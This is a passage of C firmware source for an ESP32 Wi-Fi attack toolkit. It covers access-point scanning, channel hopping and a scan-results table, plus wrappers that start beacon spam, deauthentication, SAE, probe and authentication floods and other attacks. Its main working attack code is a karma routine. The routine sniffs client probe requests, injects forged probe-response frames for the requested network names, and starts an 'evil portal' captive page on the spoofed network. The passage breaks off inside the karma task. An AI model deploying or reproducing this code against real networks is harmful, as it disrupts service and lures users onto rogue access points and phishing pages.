    xEventGroupClearBits(wifi_event_group, WIFI_CONNECTING_BIT);

    if (!connected && !wifi_connect_cancel_requested) {
        TERMINAL_VIEW_ADD_TEXT("Failed to connect to %s after %d attempts\n", ssid, max_retries);
        printf("Failed to connect to %s after %d attempts\n", ssid, max_retries);
        esp_wifi_disconnect();
    }

    wifi_connect_cancel_requested = false;
}

// Beacon spam start function - wrapper for beacon_spam module
void wifi_manager_start_beacon(const char *ssid) {
    beacon_spam_start(ssid);
}

// Function to provide access to the last scan results
void wifi_manager_get_scan_results_data(uint16_t *count, wifi_ap_record_t **aps) {
    *count = ap_count;
    *aps = scanned_aps;
}

esp_err_t wifi_manager_start_scan_with_time(int seconds) {
    ap_manager_stop_services();

    // Mark a timed scan as active so the auto-reconnect timer defers instead of
    // reconfiguring STA mid-scan (which aborts the scan -> 0 results). This path
    // calls esp_wifi_scan_start() directly and never touches the ap_scan module,
    // so ap_scan_is_running() alone wouldn't cover it.
    wifi_timed_scan_active = true;

    esp_err_t err = esp_wifi_set_mode(WIFI_MODE_STA);
    if (err != ESP_OK) {
        printf("Failed to set WiFi mode for timed scan: %s\n", esp_err_to_name(err));
        goto cleanup;
    }

    err = esp_wifi_start();
    if (err != ESP_OK) {
        printf("Failed to start WiFi for timed scan: %s\n", esp_err_to_name(err));
        goto cleanup;
    }

    wifi_scan_config_t scan_config = {
        .ssid = NULL,
        .bssid = NULL,
        .channel = 0,
        .show_hidden = true
    };

    rgb_manager_set_color(&rgb_manager, -1, 50, 255, 50, false);

    // User hop profile: scan each profile channel and merge results instead
    // of the driver's all-country-channel sweep.
    uint8_t profile_channels[WIFI_CHANNELS_MAX];
    size_t profile_count = 0;
    hop_profile_resolve(profile_channels, WIFI_CHANNELS_MAX, &profile_count);
    if (profile_count > 0) {
        printf("WiFi Scan started (%u channels)\n", (unsigned)profile_count);
        TERMINAL_VIEW_ADD_TEXT("WiFi Scan started\n");
        err = ap_scan_scan_channels(profile_channels, profile_count);
        if (err == ESP_OK) {
            printf("Found %u access points\n", ap_count);
            TERMINAL_VIEW_ADD_TEXT("Found %u access points\n", ap_count);
        } else {
            printf("WiFi scan failed to start: %s\n", esp_err_to_name(err));
            TERMINAL_VIEW_ADD_TEXT("WiFi scan failed to start\n");
        }
        wifi_timed_scan_active = false;
        esp_wifi_stop();
        (void)ap_manager_restore_after_attack("timed scan");
        return err;
    }

    printf("WiFi Scan started\n");
    printf("Please wait %d Seconds...\n", seconds);
    TERMINAL_VIEW_ADD_TEXT("WiFi Scan started\n");
    TERMINAL_VIEW_ADD_TEXT("Please wait %d Seconds...\n", seconds);

    err = esp_wifi_scan_start(&scan_config, false);
    if (err != ESP_OK) {
        printf("WiFi scan failed to start: %s\n", esp_err_to_name(err));
        TERMINAL_VIEW_ADD_TEXT("WiFi scan failed to start\n");
        goto cleanup;
    }

    vTaskDelay(pdMS_TO_TICKS(seconds * 1000));

    wifi_manager_stop_scan();
    err = esp_wifi_stop();
    if (err != ESP_OK) {
        printf("Failed to stop WiFi after timed scan: %s\n", esp_err_to_name(err));
        goto cleanup;
    }

cleanup:
    wifi_timed_scan_active = false;
    (void)ap_manager_restore_after_attack("timed scan");
    return err;
}

// Station scan channel hopping functions moved to station_scan.c module

// Wireshark Capture Channel Hopping Callback
static void wireshark_channel_hop_timer_callback(void *arg) {
    if (!wireshark_hopping_active) return;
    wireshark_channel_index = (wireshark_channel_index + 1) % wireshark_channels_count;
    uint8_t channel = wireshark_channels[wireshark_channel_index];
    
    // determine if 5ghz or 2.4ghz
    wifi_second_chan_t second = WIFI_SECOND_CHAN_NONE;
    
    #if defined(CONFIG_IDF_TARGET_ESP32C5)
    if (channel > 14) {
        // 5ghz channel - use ht40
        second = WIFI_SECOND_CHAN_ABOVE;
    }
    #endif
    
    esp_wifi_set_channel(channel, second);
}

static bool callback_uses_selected_ap_capture_plan(wifi_promiscuous_cb_t_t callback) {
    return callback == wifi_probe_scan_callback ||
           callback == wifi_deauth_scan_callback ||
           callback == wifi_beacon_scan_callback ||
           callback == wifi_raw_scan_callback ||
           callback == wifi_eapol_scan_callback ||
           callback == wifi_pwn_scan_callback ||
           callback == wifi_wps_detection_callback;
}

static void apply_selected_ap_capture_channel_plan(wifi_promiscuous_cb_t_t callback) {
    if (!callback_uses_selected_ap_capture_plan(callback)) {
        return;
    }

    if (station_scan_is_active()) {
        station_scan_stop();
    }
    if (live_ap_hopping_active) {
        stop_live_ap_channel_hopping();
    }
    if (wireshark_hopping_active) {
        wifi_manager_stop_wireshark_channel_hop();
    }

    const char *cap_name = "CAPTURE";
    if (callback == wifi_probe_scan_callback) cap_name = "PROBE";
    else if (callback == wifi_deauth_scan_callback) cap_name = "DEAUTH";
    else if (callback == wifi_beacon_scan_callback) cap_name = "BEACON";
    else if (callback == wifi_raw_scan_callback) cap_name = "RAW";
    else if (callback == wifi_eapol_scan_callback) cap_name = "EAPOL";
    else if (callback == wifi_pwn_scan_callback) cap_name = "PWN";
    else if (callback == wifi_wps_detection_callback) cap_name = "WPS";

    if (selected_ap_count <= 0 || selected_aps == NULL) {
        printf("%s: no AP selected, channel hopping disabled\n", cap_name);
        return;
    }

    uint8_t unique_channels[50] = {0};
    int unique_count = 0;
    for (int i = 0; i < selected_ap_count && unique_count < (int)(sizeof(unique_channels) / sizeof(unique_channels[0])); i++) {
        uint8_t channel = selected_aps[i].primary;
        if (channel == 0) {
            continue;
        }

        bool seen = false;
        for (int j = 0; j < unique_count; j++) {
            if (unique_channels[j] == channel) {
                seen = true;
                break;
            }
        }
        if (!seen) {
            unique_channels[unique_count++] = channel;
        }
    }

    if (unique_count <= 0) {
        printf("%s: selected APs have no valid channel, channel hopping disabled\n", cap_name);
        return;
    }

    if (unique_count == 1) {
        esp_err_t ch_err = esp_wifi_set_channel(unique_channels[0], WIFI_SECOND_CHAN_NONE);
        if (ch_err == ESP_OK) {
            printf("%s: locked to channel %d\n", cap_name, unique_channels[0]);
        } else {
            printf("%s: failed to set channel %d: %s\n", cap_name, unique_channels[0], esp_err_to_name(ch_err));
        }
        return;
    }

    memcpy(wireshark_channels, unique_channels, (size_t)unique_count * sizeof(uint8_t));
    wireshark_channels_count = (size_t)unique_count;
    wireshark_channel_index = 0;

    wifi_second_chan_t second = WIFI_SECOND_CHAN_NONE;
#if defined(CONFIG_IDF_TARGET_ESP32C5)
    if (wireshark_channels[0] > 14) {
        second = WIFI_SECOND_CHAN_ABOVE;
    }
#endif
    esp_wifi_set_channel(wireshark_channels[0], second);

    esp_timer_create_args_t timer_args = {
        .callback = wireshark_channel_hop_timer_callback,
        .name = "wireshark_hop"
    };

    esp_err_t err = esp_timer_create(&timer_args, &wireshark_channel_hop_timer);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "Failed to create selected AP capture hop timer");
        return;
    }

    err = esp_timer_start_periodic(wireshark_channel_hop_timer, WIRESHARK_CHANNEL_HOP_INTERVAL_MS * 1000);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "Failed to start selected AP capture hop timer");
        esp_timer_delete(wireshark_channel_hop_timer);
        wireshark_channel_hop_timer = NULL;
        return;
    }

    wireshark_hopping_active = true;
    printf("%s: hopping selected AP channels (%d)", cap_name, unique_count);
    for (int i = 0; i < unique_count; i++) {
        printf("%s%d", (i == 0) ? ": " : ",", unique_channels[i]);
    }
    printf("\n");
}

esp_err_t wifi_manager_start_wireshark_channel_list(const uint8_t *channels, size_t count) {
    if (!channels || count == 0 || count > sizeof(wireshark_channels)) return ESP_ERR_INVALID_ARG;

    uint8_t unique[sizeof(wireshark_channels)] = {0};
    size_t unique_count = 0;
    for (size_t i = 0; i < count; i++) {
        if (channels[i] < 1 || channels[i] > MAX_WIFI_CHANNEL) return ESP_ERR_INVALID_ARG;
        bool seen = false;
        for (size_t j = 0; j < unique_count; j++) {
            if (unique[j] == channels[i]) {
                seen = true;
                break;
            }
        }
        if (!seen) unique[unique_count++] = channels[i];
    }
    if (unique_count == 1) return wifi_manager_set_wireshark_fixed_channel(unique[0]);

    if (wireshark_channel_hop_timer != NULL) {
        esp_timer_stop(wireshark_channel_hop_timer);
        esp_timer_delete(wireshark_channel_hop_timer);
        wireshark_channel_hop_timer = NULL;
    }
    wireshark_hopping_active = false;

    memcpy(wireshark_channels, unique, unique_count);
    wireshark_channels_count = unique_count;
    wireshark_channel_index = 0;

    wifi_second_chan_t second = WIFI_SECOND_CHAN_NONE;
#if defined(CONFIG_IDF_TARGET_ESP32C5)
    if (wireshark_channels[0] > 14) second = WIFI_SECOND_CHAN_ABOVE;
#endif
    esp_err_t err = esp_wifi_set_channel(wireshark_channels[0], second);
    if (err != ESP_OK) return err;

    esp_timer_create_args_t timer_args = {
        .callback = wireshark_channel_hop_timer_callback,
        .name = "wireshark_hop"
    };
    err = esp_timer_create(&timer_args, &wireshark_channel_hop_timer);
    if (err != ESP_OK) return err;

    err = esp_timer_start_periodic(wireshark_channel_hop_timer, WIRESHARK_CHANNEL_HOP_INTERVAL_MS * 1000);
    if (err != ESP_OK) {
        esp_timer_delete(wireshark_channel_hop_timer);
        wireshark_channel_hop_timer = NULL;
        return err;
    }

    wireshark_hopping_active = true;
    return ESP_OK;
}

void wifi_manager_start_wireshark_channel_hop(void) {
    uint8_t channels[sizeof(wireshark_channels)] = {0};
    size_t count = 0;

    // Use the user hop profile when one is selected; otherwise keep the
    // historical country-appropriate channel list.
    hop_profile_resolve(channels, sizeof(channels), &count);
    if (count == 0) {
        // HOP_MODE_DEFAULT (or nothing configured): country list.
        count = wifi_channels_build_country_list(channels, sizeof(channels));
    }
    if (count == 0) {
        ESP_LOGE(TAG, "No channels available for Wireshark hopping");
        return;
    }
    esp_err_t err = wifi_manager_start_wireshark_channel_list(channels, count);
    if (err != ESP_OK) ESP_LOGE(TAG, "Failed to start Wireshark channel hopping: %s", esp_err_to_name(err));
    else ESP_LOGI(TAG, "Wireshark Channel Hopping Started (%d channels, 150ms interval)", (int)count);
}

void wifi_manager_stop_wireshark_channel_hop(void) {
    if (wireshark_channel_hop_timer) {
        esp_timer_stop(wireshark_channel_hop_timer);
        esp_timer_delete(wireshark_channel_hop_timer);
        wireshark_channel_hop_timer = NULL;
        wireshark_hopping_active = false;
        ESP_LOGI(TAG, "Wireshark Channel Hopping Stopped.");
    }
}

esp_err_t wifi_manager_set_wireshark_fixed_channel(uint8_t channel) {
    // Validate channel range based on target
    uint8_t max_channel = MAX_WIFI_CHANNEL;

    if (channel < 1 || channel > max_channel) {
        ESP_LOGE(TAG, "Invalid channel %d. Must be between 1 and %d", channel, max_channel);
        return ESP_ERR_INVALID_ARG;
    }

    // Stop any existing channel hopping
    wifi_manager_stop_wireshark_channel_hop();

    // Set the fixed channel
    esp_err_t err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "Failed to set channel %d: %s", channel, esp_err_to_name(err));
        return err;
    }

    ESP_LOGI(TAG, "Wireshark capture locked to channel %d", channel);
    return ESP_OK;
}

esp_err_t wifi_manager_set_capture_channel_lock(uint8_t channel) {
    // Validate channel range based on target
    uint8_t max_channel = MAX_WIFI_CHANNEL;

    if (channel < 1 || channel > max_channel) {
        ESP_LOGE(TAG, "Invalid capture channel %d. Must be between 1 and %d", channel, max_channel);
        return ESP_ERR_INVALID_ARG;
    }

    // Stop any active scan/capture channel hopping first so monitor mode stays locked.
    if (station_scan_is_active()) {
        station_scan_stop();
    }
    if (live_ap_hopping_active) {
        stop_live_ap_channel_hopping();
    }
    wifi_manager_stop_wireshark_channel_hop();
    if (airspace_monitor_is_active()) {
        airspace_monitor_stop();
    }

    esp_err_t err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "Failed to lock capture to channel %d: %s", channel, esp_err_to_name(err));
        return err;
    }

    ESP_LOGI(TAG, "Capture locked to channel %d", channel);
    return ESP_OK;
}

// Start station scan - delegated to station_scan module
void wifi_manager_start_station_scan() {
    station_scan_start();
}

// Print combined AP/Station scan results in ASCII chart
void wifi_manager_scanall_chart() {
    if (ap_count == 0) {
        printf("No APs found during scan.\n");
        TERMINAL_VIEW_ADD_TEXT("No APs found during scan.\n");
        return;
    }

    printf("\n--- Combined AP and Station Scan Results ---\n\n");
    TERMINAL_VIEW_ADD_TEXT("\n--- Combined AP and Station Scan Results ---\n\n");

    const char* ap_header_top =    "┌──────────────────────────────────┬───────────────────┬──────┬───────────┐";
    const char* ap_header_mid =    "│ SSID                             │ BSSID             │ Chan │ Company   │";
    const char* ap_header_bottom = "├──────────────────────────────────┼───────────────────┼──────┼───────────┤";
    const char* ap_format =        "│ %-32.32s │ %02X:%02X:%02X:%02X:%02X:%02X │ %-4d │ %-9.9s │";
    const char* ap_separator =     "├──────────────────────────────────┼───────────────────┼──────┼───────────┤";
    const char* ap_footer =        "└──────────────────────────────────┴───────────────────┴──────┴───────────┘";
    const char* sta_format =       "│   -> STA: %02X:%02X:%02X:%02X:%02X:%02X                                             │"; // Formatted station line


    // Print Header Once
    printf("%s\n", ap_header_top);
    printf("%s\n", ap_header_mid);
    printf("%s\n", ap_header_bottom);
    TERMINAL_VIEW_ADD_TEXT("%s\n", ap_header_top);
    TERMINAL_VIEW_ADD_TEXT("%s\n", ap_header_mid);
    TERMINAL_VIEW_ADD_TEXT("%s\n", ap_header_bottom);


    for (uint16_t i = 0; i < ap_count; i++) {
        char sanitized_ssid[33];
        sanitize_ssid_and_check_hidden(scanned_aps[i].ssid, sanitized_ssid, sizeof(sanitized_ssid));

        // lookup vendor using oui database
        char mac_str[18];
        snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
                 scanned_aps[i].bssid[0], scanned_aps[i].bssid[1], scanned_aps[i].bssid[2],
                 scanned_aps[i].bssid[3], scanned_aps[i].bssid[4], scanned_aps[i].bssid[5]);
        char vendor[64] = {0};
        if (!ouis_lookup_vendor(mac_str, vendor, sizeof(vendor))) {
            strncpy(vendor, "Unknown", sizeof(vendor) - 1);
        }

        // Print AP details line
        char ap_details_line[200];
        snprintf(ap_details_line, sizeof(ap_details_line), ap_format, sanitized_ssid,
                 scanned_aps[i].bssid[0], scanned_aps[i].bssid[1], scanned_aps[i].bssid[2],
                 scanned_aps[i].bssid[3], scanned_aps[i].bssid[4], scanned_aps[i].bssid[5],
                 scanned_aps[i].primary, vendor);
        printf("%s\n", ap_details_line);
        TERMINAL_VIEW_ADD_TEXT("%s\n", ap_details_line);

        bool station_found_for_ap = false;
        // Find and print associated stations for this AP
        for (int j = 0; j < station_count; j++) {
            if (memcmp(station_ap_list[j].ap_bssid, scanned_aps[i].bssid, 6) == 0) {
                // lookup vendor for station mac
                char sta_mac_str[18];
                snprintf(sta_mac_str, sizeof(sta_mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
                         station_ap_list[j].station_mac[0], station_ap_list[j].station_mac[1],
                         station_ap_list[j].station_mac[2], station_ap_list[j].station_mac[3],
                         station_ap_list[j].station_mac[4], station_ap_list[j].station_mac[5]);
                char sta_vendor[64] = {0};
                bool has_sta_vendor = ouis_lookup_vendor(sta_mac_str, sta_vendor, sizeof(sta_vendor));

                // Print station MAC using the new format
                char sta_details_line[150];
                if (has_sta_vendor) {
                    snprintf(sta_details_line, sizeof(sta_details_line), "%s (%s)",
                             sta_mac_str, sta_vendor);
                } else {
                    snprintf(sta_details_line, sizeof(sta_details_line), "%s",
                             sta_mac_str);
                }
                printf("    STA: %s\n", sta_details_line);
                TERMINAL_VIEW_ADD_TEXT("    STA: %s\n", sta_details_line);
                station_found_for_ap = true;
            }
        }

        (void)station_found_for_ap;

        // Print separator line below the AP (and its stations) if it's not the last AP
        if (i < ap_count - 1) {
            printf("%s\n", ap_separator);
            TERMINAL_VIEW_ADD_TEXT("%s\n", ap_separator);
        }
    }

    // Print Footer Once
    printf("%s\n", ap_footer);
    TERMINAL_VIEW_ADD_TEXT("%s\n", ap_footer);

    printf("\n--- End of Results ---\n\n");
    TERMINAL_VIEW_ADD_TEXT("--- End of Results ---\n\n");
}

// Stop station deauth function - wrapper for deauth_attack module
bool wifi_manager_stop_deauth_station(void) {
    return deauth_attack_stop_station();
}

// Helper function to sanitize SSID and handle hidden networks
static void sanitize_ssid_and_check_hidden(const uint8_t* input_ssid, char* output_buffer, size_t buffer_size) {
    char temp_ssid[33];
    memcpy(temp_ssid, input_ssid, 32);
    temp_ssid[32] = '\0';

    if (strlen(temp_ssid) == 0) {
        snprintf(output_buffer, buffer_size, "(Hidden)");
    } else {
        int len = strlen(temp_ssid);
        int out_idx = 0;
        for (int k = 0; k < len && out_idx < buffer_size - 1; k++) {
            char c = temp_ssid[k];
            output_buffer[out_idx++] = (c >= 32 && c <= 126) ? c : '.';
        }
        output_buffer[out_idx] = '\0';
    }
}

// Beacon list functions - wrappers for beacon_spam module
void wifi_manager_add_beacon_ssid(const char *ssid) {
    beacon_spam_add_ssid(ssid);
}

void wifi_manager_remove_beacon_ssid(const char *ssid) {
    beacon_spam_remove_ssid(ssid);
}

void wifi_manager_clear_beacon_list(void) {
    beacon_spam_clear_list();
}

void wifi_manager_show_beacon_list(void) {
    beacon_spam_show_list();
}

void wifi_manager_start_beacon_list(void) {
    beacon_spam_start_list();
}

// EAPOL Logoff Attack - delegated to eapol_logoff module
void wifi_manager_start_eapollogoff_attack(void) {
    eapol_logoff_start();
}

void wifi_manager_stop_eapollogoff_attack(void) {
    eapol_logoff_stop();
}

void wifi_manager_eapollogoff_display(void) {
    eapol_logoff_display();
}

void wifi_manager_eapollogoff_help(void) {
    eapol_logoff_help();
}

// SAE Flood Attack - delegated to sae_flood module
void wifi_manager_start_sae_flood(const char *password) {
    sae_flood_start(password);
}

void wifi_manager_stop_sae_flood(void) {
    sae_flood_stop();
}

void wifi_manager_sae_flood_help(void) {
    sae_flood_help();
}

// GTK Abuse Test - delegated to gtk_abuse module
void wifi_manager_start_gtk_abuse(const char *ssid, const char *password) {
    gtk_abuse_start(ssid, password);
}

void wifi_manager_stop_gtk_abuse(void) {
    gtk_abuse_stop();
}

bool wifi_manager_gtk_abuse_is_running(void) {
    return gtk_abuse_is_running();
}

void wifi_manager_gtk_abuse_display(void) {
    gtk_abuse_display();
}

// Channel Switch Attack - delegated to channel_switch_attack module
void wifi_manager_start_channel_switch_attack(void) {
    channel_switch_attack_start();
}

void wifi_manager_stop_channel_switch_attack(void) {
    channel_switch_attack_stop();
}

bool wifi_manager_is_channel_switch_attack_running(void) {
    return channel_switch_attack_is_running();
}

// Probe Request Flood Attack - delegated to probe_request_flood module
void wifi_manager_start_probe_flood(void) {
    probe_request_flood_start();
}

void wifi_manager_stop_probe_flood(void) {
    probe_request_flood_stop();
}

bool wifi_manager_is_probe_flood_running(void) {
    return probe_request_flood_is_running();
}

// Bad Msg Attack - delegated to bad_msg module
void wifi_manager_start_bad_msg(void) {
    bad_msg_start();
}

void wifi_manager_stop_bad_msg(void) {
    bad_msg_stop();
}

bool wifi_manager_is_bad_msg_running(void) {
    return bad_msg_is_running();
}

// Auth Flood Attack - delegated to auth_flood module
void wifi_manager_start_auth_flood(void) {
    auth_flood_start();
}

void wifi_manager_stop_auth_flood(void) {
    auth_flood_stop();
}

bool wifi_manager_is_auth_flood_running(void) {
    return auth_flood_is_running();
}

void wifi_manager_set_html_from_uart(void) {
    use_html_buffer = true;
    if (html_buffer == NULL) {
#if CONFIG_SPIRAM
        html_buffer = (char*)heap_caps_malloc(MAX_HTML_BUFFER_SIZE, MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
        if (html_buffer == NULL) {
            ESP_LOGW(TAG, "PSRAM html_buffer failed, trying internal RAM");
            html_buffer = (char*)malloc(MAX_HTML_BUFFER_SIZE);
        }
#else
        html_buffer = (char*)malloc(MAX_HTML_BUFFER_SIZE);
#endif
        if (html_buffer == NULL) {
            printf("Failed to allocate HTML buffer\n");
            use_html_buffer = false;
            log_heap_status(TAG, "html_buffer_alloc_fail");
            return;
        }
        log_heap_status(TAG, "html_buffer_alloc_ok");
    }
    html_buffer_size = 0;
    printf("HTML buffer mode enabled, ready to receive HTML content\n");
}

void wifi_manager_store_html_chunk(const char* data, size_t len, bool is_final) {
    if (!use_html_buffer || html_buffer == NULL) {
        return;
    }
    
    if (html_buffer_size + len >= MAX_HTML_BUFFER_SIZE) {
        printf("HTML buffer overflow, truncating content\n");
        len = MAX_HTML_BUFFER_SIZE - html_buffer_size - 1;
    }
    
    if (len > 0) {
        memcpy(html_buffer + html_buffer_size, data, len);
        html_buffer_size += len;
    }
    
    if (is_final) {
        html_buffer[html_buffer_size] = '\0';
        printf("HTML content stored in buffer (%zu bytes)\n", html_buffer_size);
        ESP_LOGI(TAG, "HTML capture completed: buffer=%p, size=%zu, use_html_buffer=%s", 
                 html_buffer, html_buffer_size, use_html_buffer ? "true" : "false");
    }
}

void wifi_manager_clear_html_buffer(void) {
    ESP_LOGI(TAG, "Clearing HTML buffer - current state: buffer=%p, size=%zu, use_html_buffer=%s", 
             html_buffer, html_buffer_size, use_html_buffer ? "true" : "false");
    
    use_html_buffer = false;
    if (html_buffer != NULL) {
        free(html_buffer);
        html_buffer = NULL;
    }
    html_buffer_size = 0;
    printf("HTML buffer cleared and disabled\n");
    ESP_LOGI(TAG, "HTML buffer cleared successfully");
}

/**
 * Inject SAE confirm frame after successful commit exchange
 */
static bool karma_running = false;
static TaskHandle_t karma_task_handle = NULL;

// Add these globals near your other Karma variables
static char (*karma_ssid_cache)[33];
static int karma_ssid_count = 0;
static int karma_ssid_index = 0;
static uint32_t last_ssid_change_time = 0;
static bool karma_ssid_manual_mode = false;
static char karma_portal_file[256] = "default"; // non-zero initializer: must stay in .data, not PSRAM .bss


// Helper to add SSID to cache if not present
static void karma_add_ssid(const char *ssid) {
    if (ssid == NULL || strlen(ssid) == 0) return;
    if (karma_ssid_cache == NULL) {
        karma_ssid_cache = calloc(KARMA_MAX_SSIDS, sizeof(*karma_ssid_cache));
        if (karma_ssid_cache == NULL) {
            printf("Karma: unable to allocate SSID cache\n");
            return;
        }
    }
    // Check for duplicate
    for (int i = 0; i < karma_ssid_count; ++i) {
        if (strcmp(karma_ssid_cache[i], ssid) == 0) return;
    }
    // Add if space
    if (karma_ssid_count < KARMA_MAX_SSIDS) {
        strncpy(karma_ssid_cache[karma_ssid_count], ssid, 32);
        karma_ssid_cache[karma_ssid_count][32] = '\0';
        karma_ssid_count++;
        printf("Karma cached SSID: %s\n", ssid);
        TERMINAL_VIEW_ADD_TEXT("Karma cached SSID: %s\n", ssid);
    }
}

void wifi_manager_set_karma_ssid_list(const char **ssids, int count) {
    if (count > KARMA_MAX_SSIDS) count = KARMA_MAX_SSIDS;
    karma_ssid_count = 0;
    if (count > 0 && karma_ssid_cache == NULL) {
        karma_ssid_cache = calloc(KARMA_MAX_SSIDS, sizeof(*karma_ssid_cache));
        if (karma_ssid_cache == NULL) {
            printf("Karma: unable to allocate SSID cache\n");
            return;
        }
    }
    for (int i = 0; i < count; ++i) {
        if (ssids[i] && strlen(ssids[i]) > 0 && strlen(ssids[i]) < 33) {
            strncpy(karma_ssid_cache[karma_ssid_count], ssids[i], 32);
            karma_ssid_cache[karma_ssid_count][32] = '\0';
            karma_ssid_count++;
        }
    }
    karma_ssid_index = 0;
    karma_ssid_manual_mode = true;
}

void wifi_manager_set_karma_portal_file(const char *path) {
    if (path && strlen(path) < sizeof(karma_portal_file)) {
        strncpy(karma_portal_file, path, sizeof(karma_portal_file) - 1);
        karma_portal_file[sizeof(karma_portal_file) - 1] = '\0';
    } else {
        strncpy(karma_portal_file, "default", sizeof(karma_portal_file));
    }
}

// Helper function to send a probe response to a station
static void karma_send_probe_response(const uint8_t *sta_mac, const char *ssid) {
    uint8_t resp[128] = {0};
    int idx = 0;
    // Frame Control: Probe Response (0x50 0x00)
    resp[idx++] = 0x50; resp[idx++] = 0x00;
    // Duration
    resp[idx++] = 0x00; resp[idx++] = 0x00;
    // Destination: station MAC
    memcpy(&resp[idx], sta_mac, 6); idx += 6;
    // Source: our AP MAC
    uint8_t ap_mac[6];
    esp_wifi_get_mac(WIFI_IF_AP, ap_mac);
    memcpy(&resp[idx], ap_mac, 6); idx += 6;
    // BSSID: our AP MAC
    memcpy(&resp[idx], ap_mac, 6); idx += 6;
    // Seq-ctl
    resp[idx++] = 0x00; resp[idx++] = 0x00;
    // Timestamp (8 bytes)
    memset(&resp[idx], 0, 8); idx += 8;
    // Beacon interval
    resp[idx++] = 0x64; resp[idx++] = 0x00;
    // Capability info
    resp[idx++] = 0x11; resp[idx++] = 0x04;
    // SSID IE
    resp[idx++] = 0x00; // Tag
    resp[idx++] = strlen(ssid); // Length
    memcpy(&resp[idx], ssid, strlen(ssid)); idx += strlen(ssid);
    // Supported rates IE
    resp[idx++] = 0x01; resp[idx++] = 0x08;
    resp[idx++] = 0x82; resp[idx++] = 0x84; resp[idx++] = 0x8B; resp[idx++] = 0x96;
    resp[idx++] = 0x24; resp[idx++] = 0x30; resp[idx++] = 0x48; resp[idx++] = 0x6C;
    // DS Parameter Set IE (channel)
    resp[idx++] = 0x03; resp[idx++] = 0x01;
    uint8_t channel = 1;
    wifi_second_chan_t second;
    esp_wifi_get_channel(&channel, &second);
    resp[idx++] = channel;

    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, resp, idx, false);

    // --- VERBOSE LOGGING FOR KARMA INTERACTIONS ---
    if (err == ESP_OK) {
        printf("[KARMA] Sent probe response to STA %02X:%02X:%02X:%02X:%02X:%02X for SSID '%s'\n",
            sta_mac[0], sta_mac[1], sta_mac[2], sta_mac[3], sta_mac[4], sta_mac[5], ssid);
        TERMINAL_VIEW_ADD_TEXT("[KARMA] Sent probe response to STA %02X:%02X:%02X:%02X:%02X:%02X for SSID '%s'\n",
            sta_mac[0], sta_mac[1], sta_mac[2], sta_mac[3], sta_mac[4], sta_mac[5], ssid);
    } else {
        printf("[KARMA] Failed to send probe response to STA %02X:%02X:%02X:%02X:%02X:%02X for SSID '%s': %s\n",
            sta_mac[0], sta_mac[1], sta_mac[2], sta_mac[3], sta_mac[4], sta_mac[5], ssid, esp_err_to_name(err));
        TERMINAL_VIEW_ADD_TEXT("[KARMA] Failed to send probe response to STA %02X:%02X:%02X:%02X:%02X:%02X for SSID '%s': %s\n",
            sta_mac[0], sta_mac[1], sta_mac[2], sta_mac[3], sta_mac[4], sta_mac[5], ssid, esp_err_to_name(err));
    }
}

static void karma_probe_request_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT) return;
    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)pkt->payload;
    const wifi_ieee80211_hdr_t *hdr = &ipkt->hdr;
    uint8_t subtype = (hdr->frame_ctrl & 0xF0) >> 4;
    if (subtype != 4) return;
    const uint8_t *payload = ipkt->payload;
    int ssid_offset = 0;
    while (ssid_offset < pkt->rx_ctrl.sig_len - 24) {
        if (payload[ssid_offset] == 0x00) { // SSID IE
            uint8_t ssid_len = payload[ssid_offset + 1];
            if (ssid_len > 0 && ssid_len < 33) {
                char probed_ssid[33] = {0};
                memcpy(probed_ssid, &payload[ssid_offset + 2], ssid_len);
                if (!karma_ssid_manual_mode) {
                    karma_add_ssid(probed_ssid);
                }
                printf("[KARMA] Received probe request from STA %02X:%02X:%02X:%02X:%02X:%02X for SSID '%s'\n",
                    hdr->addr2[0], hdr->addr2[1], hdr->addr2[2], hdr->addr2[3], hdr->addr2[4], hdr->addr2[5], probed_ssid);
                TERMINAL_VIEW_ADD_TEXT("[KARMA] Received probe request from STA %02X:%02X:%02X:%02X:%02X:%02X for SSID '%s'\n",
                    hdr->addr2[0], hdr->addr2[1], hdr->addr2[2], hdr->addr2[3], hdr->addr2[4], hdr->addr2[5], probed_ssid);
                // Respond directly to probe request
                karma_send_probe_response(hdr->addr2, probed_ssid);
            }
            break;
        }
        ssid_offset += payload[ssid_offset + 1] + 2;
    }
}

static void karma_start_portal_for_ssid(const char *ssid) {
    // Use the configured portal file (default or custom from SD), SSID as AP name, open AP
    if (!karma_portal_active) {
        wifi_manager_start_evil_portal(karma_portal_file, ssid, "", ssid, "portal.local");
        karma_portal_active = true;
        printf("[KARMA] Evil portal started for SSID: %s\n", ssid);
        TERMINAL_VIEW_ADD_TEXT("[KARMA] Evil portal started for SSID: %s\n", ssid);
    }
}

static void karma_stop_portal_if_active(void) {
    if (karma_portal_active) {
        wifi_manager_stop_evil_portal();
        karma_portal_active = false;
        printf("[KARMA] Evil portal stopped\n");
        TERMINAL_VIEW_ADD_TEXT("[KARMA] Evil portal stopped\n");
    }
}

static void karma_task(void *param) {
    printf("Karma attack started\n");
    TERMINAL_VIEW_ADD_TEXT("Karma attack started\n");

    // Enable promiscuous mode for capturing probe requests
    wifi_promiscuous_filter_t filter = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT };
    esp_err_t err = esp_wifi_set_promiscuous_filter(&filter);
    if (err != ESP_OK) {
        printf("Karma: failed to set promiscuous filter: %s\n", esp_err_to_name(err));
    }
    err = esp_wifi_set_promiscuous(true);
    if (err != ESP_OK) {
        printf("Karma: failed to enable promiscuous mode: %s\n", esp_err_to_name(err));
    }
    esp_wifi_set_promiscuous_rx_cb(karma_probe_request_callback);

    last_ssid_change_time = esp_timer_get_time() / 1000;

    printf("Karma: entering loop, ssid_count=%d, ap_sta_has_ip=%d\n", karma_ssid_count, ap_sta_has_ip);
    fflush(stdout);

    // If only one SSID, set it once and don't rotate
    if (karma_ssid_count == 1) {
        wifi_config_t ap_config = {
            .ap = {
                .ssid = "",
